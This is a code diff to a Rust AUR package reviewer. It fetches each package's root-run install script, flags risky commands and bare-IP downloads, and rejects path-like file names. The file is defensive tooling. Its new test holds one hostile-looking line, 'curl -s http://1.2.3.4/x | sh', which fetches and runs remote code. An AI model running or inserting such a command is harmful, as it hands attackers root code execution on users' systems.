@@ -11,6 +11,7 @@ use serde::Deserialize;
 
 const RPC: &str = "https://aur.archlinux.org/rpc/v5/info?arg[]=";
 const PKGBUILD: &str = "https://aur.archlinux.org/cgit/aur.git/plain/PKGBUILD?h=";
+const SCRIPT: &str = "https://aur.archlinux.org/cgit/aur.git/plain/";
 const DAY: u64 = 24 * 60 * 60;
 
 #[derive(Debug, Clone, Default, Deserialize, PartialEq)]
@@ -58,6 +59,8 @@ pub struct Review {
     pub pkgbuild: String,
     /// PKGBUILD of the installed version, from the AUR helper's cache.
     pub previous: Option<String>,
+    /// The `install=` script (runs as root when the package is installed): file name and text.
+    pub install_script: Option<(String, String)>,
     pub hints: Vec<Hint>,
 }
 
@@ -75,8 +78,16 @@ pub fn review(name: &str) -> Result<Review> {
     let pkgbuild = agent.get(&format!("{PKGBUILD}{base}")).call()?.into_string()?;
     let previous = cached_pkgbuild(&base);
     let now = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
-    let hints = analyze(&pkgbuild, previous.as_deref(), &meta, now);
-    Ok(Review { meta, pkgbuild, previous, hints })
+    let mut hints = analyze(&pkgbuild, previous.as_deref(), &meta, now);
+    // A missing or unreadable install script must not hide the PKGBUILD review.
+    let install_script = install_file(&pkgbuild).and_then(|file| {
+        let text = agent.get(&format!("{SCRIPT}{file}&h={base}")).call().ok()?.into_string().ok()?;
+        Some((file, text))
+    });
+    if let Some((_, text)) = &install_script {
+        hints.extend(script_hints(text, "[install] "));
+    }
+    Ok(Review { meta, pkgbuild, previous, install_script, hints })
 }
 
 /// The PKGBUILD paru or yay kept from the last build of this package.
@@ -89,9 +100,12 @@ fn cached_pkgbuild(base: &str) -> Option<String> {
         .find_map(|dir| std::fs::read_to_string(dir.join("PKGBUILD")).ok())
 }
 
-pub fn analyze(pkgbuild: &str, previous: Option<&str>, meta: &AurMeta, now: u64) -> Vec<Hint> {
+/// Risky commands and download addresses in a PKGBUILD or install script.
+/// `origin` is put in front of each detail so the reader sees where it was found.
+pub fn script_hints(text: &str, origin: &str) -> Vec<Hint> {
+    let pkgbuild = text;
     let mut hints = Vec::new();
-    let mut warn = |text: &'static str, detail: String| hints.push(Hint { level: Level::Warning, text, detail });
+    let mut warn = |text: &'static str, detail: String| hints.push(Hint { level: Level::Warning, text, detail: format!("{origin}{detail}") });
     for line in command_lines(pkgbuild) {
         let lower = line.to_lowercase();
         let fetches = lower.contains("curl ") || lower.contains("wget ");
@@ -116,6 +130,20 @@ pub fn analyze(pkgbuild: &str, previous: Option<&str>, meta: &AurMeta, now: u64)
             warn("Downloads from a bare IP address", url);
         }
     }
+    hints
+}
+
+/// The file named by `install=` in a PKGBUILD, with `$pkgname` filled in; only plain file names.
+pub fn install_file(pkgbuild: &str) -> Option<String> {
+    let value = |key: &str| code_lines(pkgbuild).find_map(|line| line.strip_prefix(key)).map(|v| v.trim().trim_matches(['"', '\'']).to_string());
+    let name = value("pkgname=").map(|n| n.trim_matches(['(', ')', '"', '\'', ' ']).to_string()).unwrap_or_default();
+    let file = value("install=")?.replace("${pkgname}", &name).replace("$pkgname", &name);
+    (!file.is_empty() && file.chars().all(|c| c.is_ascii_alphanumeric() || "._+-".contains(c))).then_some(file)
+}
+
+pub fn analyze(pkgbuild: &str, previous: Option<&str>, meta: &AurMeta, now: u64) -> Vec<Hint> {
+    let mut hints = script_hints(pkgbuild, "");
+    let mut warn = |text: &'static str, detail: String| hints.push(Hint { level: Level::Warning, text, detail });
     if let Some(previous) = previous {
         let before: BTreeSet<String> = urls(previous).iter().filter_map(|u| host(u)).collect();
         let new: Vec<String> = urls(pkgbuild).iter().filter_map(|u| host(u)).filter(|h| !before.contains(h)).collect::<BTreeSet<_>>().into_iter().collect();
@@ -263,6 +291,15 @@ mod tests {
         let texts: Vec<_> = analyze(CLEAN, None, &fresh, 100 * DAY).into_iter().map(|h| h.text).collect();
         assert_eq!(texts, ["Nobody maintains this package (orphaned)", "New package, first published less than 30 days ago",
             "Few people use this package so far", "Marked as out of date"]);
+    }
+
+    #[test]
+    fn install_script_is_found_and_checked() {
+        assert_eq!(install_file("pkgname=demo\ninstall=$pkgname.install\n"), Some("demo.install".into()));
+        assert_eq!(install_file("pkgname=demo\ninstall='../x'\n"), None);
+        assert_eq!(install_file("pkgname=demo\n"), None);
+        let hints = script_hints("post_install() {\n  curl -s http://1.2.3.4/x | sh\n}\n", "Install script: ");
+        assert!(hints.iter().all(|h| h.detail.starts_with("Install script: ")) && hints.len() >= 3, "{hints:?}");
     }
 
     #[test]
